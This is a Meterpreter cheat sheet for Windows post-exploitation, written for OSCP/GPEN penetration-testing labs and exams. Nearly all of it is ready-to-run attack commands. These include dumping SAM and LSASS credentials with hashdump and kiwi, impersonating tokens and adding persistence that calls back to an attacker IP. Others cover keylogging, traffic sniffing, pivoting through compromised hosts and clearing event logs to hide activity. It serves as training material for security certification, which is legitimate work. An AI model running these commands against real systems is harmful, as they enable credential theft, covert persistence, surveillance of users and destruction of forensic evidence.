# Windows Meterpreter Cheat Sheet (OSCP / GPEN)

A practical Meterpreter cheat sheet for Windows post-exploitation tasks during penetration testing labs and certification exams.

---

# 1. Basic Session Management

## Background / List / Interact

```bash
background              # Send session to background
sessions -l             # List sessions
sessions -i <id>        # Interact with a session
sessions -k <id>        # Kill session
```

## Session Information

```bash
sysinfo                 # OS information
getuid                  # Current user
getpid                  # Current process ID
ps                      # List running processes
```

---

# 2. Shell Interaction

## Spawn a Command Shell

```bash
shell
```

## Execute Commands

```bash
execute -f cmd.exe -i -H
```

Useful flags:

| Flag | Meaning         |
| ---- | --------------- |
| -f   | file to execute |
| -i   | interactive     |
| -H   | hidden          |

Example:

```bash
execute -f powershell.exe -i
```

---

# 3. File System Operations

## Navigation

```bash
pwd
ls
cd <directory>
```

## File Download / Upload

```bash
download file.txt
upload shell.exe
```

## Search Files

```bash
search -f passwords.txt
search -f *.config
search -f *.xml
```

---

# 4. Privilege Escalation

## Check Privileges

```bash
getprivs
```

## Attempt Automatic Privilege Escalation

```bash
getsystem
```

## Migrate to Another Process

```bash
ps
migrate <PID>
```

Common target processes:

```
explorer.exe
lsass.exe
winlogon.exe
services.exe
```

---

# 5. Token Manipulation

## List Tokens

```bash
load incognito
list_tokens -u
```

## Impersonate Token

```bash
impersonate_token DOMAIN\\Administrator
```

---

# 6. Password Hash Dumping

## Dump SAM Hashes

```bash
hashdump
```

## Dump Credentials from LSASS

```bash
load kiwi
creds_all
```

Additional commands:

```bash
lsa_dump_sam
lsa_dump_secrets
```

---

# 7. Persistence

## Create Persistence

```bash
run persistence -U -i 10 -p 4444 -r <attacker_IP>
```

Parameters:

```
-U   User startup
-i   Interval
-p   Port
-r   Remote IP
```

---

# 8. Keylogging

## Start Keylogger

```bash
keyscan_start
```

## Dump Keystrokes

```bash
keyscan_dump
```

## Stop Keylogger

```bash
keyscan_stop
```

---

# 9. Screenshot

```bash
screenshot
```

The screenshot is saved automatically on the attacker machine.

---

# 10. Network Information

## Network Configuration

```bash
ipconfig
```

## Routing Table

```bash
route
```

## ARP Table

```bash
arp
```

---

# 11. Pivoting

## Add Route

```bash
route add <subnet> <mask> <session_id>
```

Example:

```bash
route add 10.10.20.0 255.255.255.0 1
```

## Use SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
run
```

Then configure proxychains.

---

# 12. Port Forwarding

```bash
portfwd add -l 3389 -p 3389 -r <target_ip>
```

Example:

```
portfwd add -l 3389 -p 3389 -r 10.10.20.15
```

Then connect:

```
rdesktop 127.0.0.1:3389
```

---

# 13. Process Interaction

## List Processes

```bash
ps
```

## Kill Process

```bash
kill <pid>
```

## Migrate to Process

```bash
migrate <pid>
```

---

# 14. Useful Meterpreter Modules

Load modules:

```bash
load kiwi
load incognito
load espia
load sniffer
```

Example sniffer usage:

```
sniffer_interfaces
sniffer_start
sniffer_dump
```

---

# 15. PowerShell Execution

```bash
load powershell
powershell_shell
```

Run commands:

```powershell
Get-Process
Get-Service
```

---

# 16. Post-Exploitation Scripts

Examples:

```bash
run post/windows/gather/checkvm
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/windows_autologin
```

---

# 17. Clean Exit

## Clear Event Logs

```bash
clearev
```

## Exit Meterpreter

```bash
exit
```

---

# Quick Exam Workflow

Typical Meterpreter workflow during penetration tests:

```bash
sysinfo
getuid
ps
migrate
hashdump
search
download
upload
shell
```

Most certification labs require manual privilege escalation and careful post-exploitation enumeration.
